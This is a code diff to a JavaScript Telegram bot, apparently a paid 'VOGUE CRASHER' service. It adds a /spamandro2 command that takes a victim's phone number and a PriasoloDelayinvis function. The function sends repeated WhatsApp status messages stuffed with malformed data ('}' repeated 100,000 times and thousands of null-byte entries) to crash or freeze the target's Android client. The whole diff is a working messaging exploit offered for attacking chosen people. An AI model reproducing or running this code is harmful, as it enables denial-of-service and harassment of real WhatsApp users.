@@ -4762,6 +4762,82 @@ Please verify the target input and system status before retrying.`
     }
 });
 
+bot.command('spamandro2', checkExecutionLimit, checkPremiumAccess, checkWhatsAppConnection, CheckCooldown, async (ctx) => {
+    
+    let q = ctx.message?.text?.split(" ")[1];
+    
+    if (!q) return ctx.reply(
+        `Invalid Format
+
+Usage:
+/spamandro <target_number>
+
+Example:
+/spamandro 628xxxxxxxx`
+    );
+    
+    let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+    
+    try {
+        
+        const sent = await ctx.replyWithPhoto(thumbnailUrl, {
+            caption: `
+\`\`\`ruby
+V O G U E  •  C R A S H E R
+──────────────────────────
+
+EXECUTION STATUS
+
+Target      : ${q}
+Status      : Success
+Description : Android Delay Invisible
+
+──────────────────────────
+\`\`\``,
+            parse_mode: "markdown",
+            reply_markup: {
+                inline_keyboard: [
+                    [{
+                        text: "Check Target",
+                        url: `https://wa.me/${q}`,
+                        style: "primary"
+                    }]
+                ]
+            }
+        });
+        
+        (async () => {
+            
+            const instanceId = Date.now() + Math.random();
+            
+            for (let i = 0; i < 3; i++) {
+                try {
+                    await PriasoloDelayinvis(sock, target);
+                    await sleep(1500)
+                } catch (e) {
+                    console.log(`[WORKER ${instanceId}] Error: ${e.message}`);
+                    await restartBot("Connection Closed");
+                }
+            }
+            
+            console.log(`[WORKER ${instanceId}] Done for ${q}`);
+            
+        })();
+        
+    } catch (error) {
+        
+        ctx.reply(
+            `Operation Failed
+
+The system was unable to execute the requested module.
+Please verify the target input and system status before retrying.`
+        );
+        
+        console.log(`[VOGUE CRASHER] Execution failed for ${q}`);
+        await restartBot("Connection Closed");
+    }
+});
+
 //    ______ _   _ _   _ _____ _____ _____ _____ _   _ 
 //    |  ___| | | | \ | /  __ \_   _|_   _|  _  | \ | |
 //    | |_  | | | |  \| | /  \/ | |   | | | | | |  \| |
@@ -5419,6 +5495,77 @@ async function VogueBuldo(sock, target) {
   }
   await sleep(1500)
 }
+}
+
+async function PriasoloDelayinvis(sock, target) {
+  for (let i = 0; i < 10; i++) {
+    await sock.relayMessage(
+      "status@broadcast",
+      {
+        imageMessage: {
+          url: "https://mmg.whatsapp.net/o1/v/t24/f2/m269/AQN5SPRzLJC6O-BbxyC5MdKx4_dnGVbIx1YkCz7vUM_I4lZaqXevb8TxmFJPT0mbUhEuVm8GQzv0i1e6Lw4kX8hG-x21PraPl0Xb6bAVhA?ccb=9-4&oh=01_Q5Aa1wH8yrMTOlemKf-tfJL-qKzHP83DzTL4M0oOd0OA3gwMlg&oe=68723029&_nc_sid=e6ed6c&mms3=true",
+          mimetype: "image/jpeg",
+          fileSha256: "UFo9Q2lDI3u2ttTEIZUgR21/cKk2g1MRkh4w5Ctks7U=",
+          fileLength: "98",
+          height: 4,
+          width: 4,
+          mediaKey: "UBWMsBkh2YZ4V1m+yFzsXcojeEt3xf26Ml5SBjwaJVY=",
+          fileEncSha256: "9mEyFfxHmkZltimvnQqJK/62Jt3eTRAdY1GUPsvAnpE=",
+          directPath: "/o1/v/t24/f2/m269/AQN5SPRzLJC6O-BbxyC5MdKx4_dnGVbIx1YkCz7vUM_I4lZaqXevb8TxmFJPT0mbUhEuVm8GQzv0i1e6Lw4kX8hG-x21PraPl0Xb6bAVhA?ccb=9-4&oh=01_Q5Aa1wH8yrMTOlemKf-tfJL-qKzHP83DzTL4M0oOd0OA3gwMlg&oe=68723029&_nc_sid=e6ed6c",
+          mediaKeyTimestamp: "1749728782"
+        },
+        hasMediaAttachment: true,
+        nativeFlowMessage: {
+          messageParamsJson: ""
+        },
+        messageContextInfo: {
+          deviceListMetadata: {},
+          deviceListMetadataVersion: 2
+        },
+        interactiveResponseMessage: {
+          body: {
+            text: "",
+            format: "DEFAULT"
+          },
+          nativeFlowResponseMessage: {
+            name: "call_permission_request",
+            paramsJson: "}".repeat(100000),
+            version: 3
+          },
+          contextInfo: {
+            remoteJid: "K",
+            urlTrackingMap: {
+              urlTrackingMapElements: Array.from({ length: 4000 }, () => ({
+                "\u0000": "\u0000"
+              }))
+            }
+          }
+        }
+      },
+      {
+        statusJidList: [target],
+        additionalNodes: [
+          {
+            tag: "meta",
+            attrs: { status_setting: "contacts" },
+            content: [
+              {
+                tag: "mentioned_users",
+                attrs: {},
+                content: [
+                  {
+                    tag: "to",
+                    attrs: { jid: target },
+                    content: []
+                  }
+                ]
+              }
+            ]
+          }
+        ]
+      }
+    );
+  }
 }
 
 
